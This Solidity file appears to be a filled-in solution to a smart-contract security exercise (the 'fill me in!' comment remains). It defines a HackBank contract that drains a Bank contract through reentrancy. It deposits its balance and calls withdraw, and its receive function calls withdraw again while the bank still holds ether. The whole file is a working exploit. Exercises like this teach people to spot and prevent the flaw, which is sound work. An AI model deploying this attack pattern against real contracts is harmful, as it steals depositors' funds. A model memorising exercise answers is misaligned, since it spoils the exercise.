// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Bank.sol";

contract HackBank {
    Bank bank;

    constructor(address payable _bankAddress) payable {
        bank = Bank(_bankAddress);
    }

    function hackContract() external {
        // fill me in!
        bank.deposit{value: address(this).balance}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}
